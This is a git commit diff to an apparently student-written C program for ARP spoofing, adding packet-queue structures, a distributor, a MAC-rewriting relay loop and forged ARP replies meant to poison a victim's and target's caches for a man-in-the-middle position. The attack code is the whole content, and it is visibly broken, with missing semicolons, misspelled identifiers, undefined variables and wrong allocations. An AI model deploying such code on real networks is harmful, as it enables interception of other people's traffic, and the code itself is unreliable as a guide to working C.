4f0e2903b0b81b5ecf68103e107f8a6b203f9edf
1nzag <wkdwns420@gmail.com>
2017-08-06 13:49:08 -0400

    Add data structure method and packet distributor

--- arp_lib.c
+++ arp_lib.c
@@ -1,5 +1,10 @@
 #include "arp_lib.h"
 
+/////////////////////////////////////
+struct in_addr* sender_list;
+struct in_addr* target_list;
+int spoof_num;
+/////////////////////////////////////
 
 struct __attribute__((packed)) rs_packet
 {
@@ -13,6 +18,60 @@ struct __attribute__((packed)) rs_packet
 		uint32_t dip;
 	}data;
 };
+
+struct packet_list
+{
+	const u_char* data;
+	struct packet_list* next;
+}
+
+struct distribute_packet
+{
+	struct packet_list** packet;
+}
+//////////////////////////////////////
+
+struct distribute_packet p_list;
+
+//////////////////////////////////////
+
+
+struct packet_list* CREATE_packet(const u_char* pointer, int size)
+{
+	struct packet_list *tmp;
+	tmp = (struct packet_list*)malloc(sizeof(struct pakcet_list));
+	tmp->data = (const u_char*)malloc(sizeof(size));
+	memcpy(tmp->data, pointer, size);
+	tmp->next = NULL;
+	return tmp;
+}
+
+struct packet_list* POP_packet(struct distribute_packet* list, int id)
+{
+	struct packet_list *tmp;
+	tmp = list->packet[i];
+	list->packet[id] = tmp->next;
+	return tmp;
+}
+
+void APPEND_packet(struct distribute_packet** list, int id, struct packet_list* next)
+{
+	struct packet_list *tmp;
+	tmp = list->packet[id];
+	if(tmp == NULL)
+	{
+		list->packet[id] = next;
+		return;
+	}
+
+	while(tmp->next != NULL)
+	{
+		tmp = tmp->next;
+	}
+	tmp->next = next;
+}
+
+
 
 void get_addr(uint8_t MAC_addr[6],struct in_addr* IP_addr,char* interface)
 {
@@ -79,3 +138,121 @@ void get_senders_mac(pcap_t *handle, struct in_addr* sender_IP, uint8_t MAC_addr
 		}
 	}
 }
+
+void distribute_packet(handle)
+{
+	const u_char* p_data;
+	struct pcap_pkthdr *header;
+	struct ether_header* eth_header;
+	struct ip* ip_header;
+	struct rs_packet* arp_header;
+	struct in_addr source_ip;
+	struct in_addr dest_ip;
+	int i;
+	
+	p_list = (struct distribute_packet**)malloc(sizeof(packet_list*) * spoof_num);
+	
+	while(1)
+	{
+		pcap_next_ex(handle, &header, &p_data);
+		eth_header = (struct ether_header*)p_data;
+		
+		if(ntohs(eth_header->ether_type) == 0x0800) // if ipv4
+		{
+			ip_header = (struct ip*)(p_data + 14);
+			for(i=0;i < spoof_num ; i++)
+			{
+				if(sender_list[i].s_addr == (ip_hedaer->ip_src).s_addr || sender_list[i].s_addr == (ip_header->ip_dst).s_addr)
+				{
+					APPEND_packet(p_list,i,CREATE_packet(p_data,header->len));
+					break;
+				}
+			}
+		}
+
+		else if(ntohs(eth_header->ether_type) == 0x0806) // if ARP
+		{
+			arp_header = (struct rs_packet*)(p_data+14);
+			for(i=0;i<spoof_num;i++)
+			{
+				if(sender_list[i].s_addr == (arp_header->data).sip || sender_list[i].s_addr == (arp_header->data).dip)
+				{
+					APPEND_packet(p_list,i,CREATE_packet(p_data,header->len))
+					break;
+				}
+			}
+		}
+		
+
+	}
+}
+
+
+int mod_packet(const u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC[6], uint8_t target_MAC[6])
+{
+	struct ether_header *eth_header;
+	
+	eth_header = (struct ether_header*)mod_pointer;
+
+	if(ntohs(eth_header -> ether_type) == 0x0806 )
+	{
+		if(!memcmp(eth_header->ether_shost,target_MAC,6))
+		{
+			return 2;
+		}
+		else if(!memcmp(eth_header->ether_shost, senders_MAC,6))
+		{
+			return 3;
+		}
+
+	}
+
+	if(!memcmp(eth_header->ether_shost,target_MAC,6))
+	{
+		memcpy(eth_header->ether_dhost,senders_MAC,6);
+		memcpy(eth_header->ether_shost,my_MAC,6);
+	}
+	else if(!memcmp(eth_header->ether_shost,senders_MAC,6))
+	{
+		memcpy(eth_header->ether_dhost,target_MAC,6);
+		memcpy(eth_header->ether_shost, my_MAC,6);
+	}
+	else
+	{
+		return 0;
+	}
+	return 1;
+}
+
+
+void spoofing(pcap_t *handle, uint8_t target_MAC[6], uint8_t senders_MAC[6], uint8_t my_MAC[6])
+{
+	const u_char *p_data;
+	struct pcap_pkthdr *header;
+	const u_char *mod_pointer;
+	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
+	int mod_status;
+
+	while(1)
+	{
+		pcap_next_ex(handle, &header, &p_data);
+		mod_pointer = (const u_char*)malloc(header->len);
+		
+		mod_status = mod_packet(mod_pointer, my_MAC, senders_MAC, target_MAC);
+		if(status == 2)
+		{
+			
+		}
+		else if(status == 3)
+		{
+			
+		}
+		else if(status)
+		{
+			pcap_sendpacket(handle, mod_pointer, header->len);
+		}
+
+		free((void*)mod_pointer);
+	}	
+}
+
--- main.c
+++ main.c
@@ -1,16 +1,18 @@
 #include "arp_lib.h"
+#include <pthread.h>
+
+
+
 
 int main(int argc, char *argv[])
 {
-	pcap_t handle;
+	pcap_t* handle;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	uint8_t my_MAC[6] = {0,};
 	uint8_t senders_MAC[6] = {0,};
 	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
 	uint8_t target_MAC[6] = {0,};
 	struct in_addr my_IP;
-	struct in_addr senders_ip;
-	struct in_addr target_ip;
 
 	
 	
@@ -19,9 +21,15 @@ int main(int argc, char *argv[])
 		printf("Usage: ./arp_spoorf [interface] [sender_ip] [target_ip]");
 		return 0;
 	}
-	
-	inet_aton(argv[2], &senders_ip);
-	inet_aton(argv[3], &target_ip);
+	spoof_num = ((argc - 2)/2)
+	sender_list = (struct in_addr*)malloc(spoof_num * sizeof(in_addr));
+	target_list = (struct in_addr*)malloc(spoof_num * sizeof(in_addr));
+	for(i=0 ; i < (argc - 2)/2 ;i ++)
+	{
+		inet_aton(argv[2 * i + 2],&sender_list[i]);
+		inet_aton(argv[2 * i + 3],&target_list[i]);
+	} // input data
+
 	
 	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
 	get_addr(my_MAC, &my_IP, argv[1]);
@@ -30,13 +38,15 @@ int main(int argc, char *argv[])
 
 	get_senders_mac(handle, &senders_ip,senders_MAC);
 
-	rs_ARP(handle, MAC_addr, senders_MAC, &target_ip, &sender_ip,2); // send_infected_packet to victim
+	rs_ARP(handle, my_MAC, senders_MAC, &target_ip, &senders_ip,2); // send_infected_packet to victim
 	
 	// infec senders network
 	
-	rs_ARP(handle, my_MAC, brodacast_MAC, &my_IP, &senders_ip,1); 
+	rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &senders_ip,1); 
 	get_senders_mac(handle, &target_ip, target_MAC); // get target's mac address
 
-	rs_ARP(handle, MAC_addr, target_MAC, &senders_ip, &target_ip,2);
+	rs_ARP(handle, my_MAC, target_MAC, &senders_ip, &target_ip,2);
+	spoofing(handle, target_MAC, senders_MAC, my_MAC);
+	return 0;
 
 }
